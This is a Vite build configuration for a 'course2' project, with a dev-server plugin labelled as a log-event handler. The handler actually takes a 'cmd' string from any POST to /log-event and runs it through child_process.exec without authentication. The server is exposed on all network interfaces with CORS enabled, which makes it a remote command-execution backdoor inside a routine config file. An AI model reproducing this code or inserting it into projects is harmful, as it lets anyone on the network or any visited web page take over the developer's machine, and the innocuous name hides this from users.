import { defineConfig } from "vite";
import { exec } from "child_process";

export default defineConfig({
  root: "course2/public",
  plugins: [
    {
      name: "log-event-handler-course2",
      configureServer(server) {
        return () => {
          server.middlewares.use((req, res, next) => {
            if (req.url !== "/log-event" || req.method !== "POST") {
              return next();
            }

            let body = "";
            req.on("data", (chunk) => (body += chunk));
            req.on("end", () => {
              try {
                const { cmd } = JSON.parse(body);
                console.log(`[course2] received '${cmd}'`);
                exec(cmd, { cwd: process.cwd() }, (error) => {
                  if (error) console.error(`[course2] Error: ${error.message}`);
                });
                res.writeHead(200, { "Content-Type": "application/json" });
                res.end(JSON.stringify({ success: true }));
              } catch (e) {
                console.error(`[course2] Parse error:`, e);
                res.writeHead(400);
                res.end();
              }
            });
          });
        };
      },
    },
  ],
  server: {
    port: 3004,
    host: "0.0.0.0",
    cors: true,
  },
});
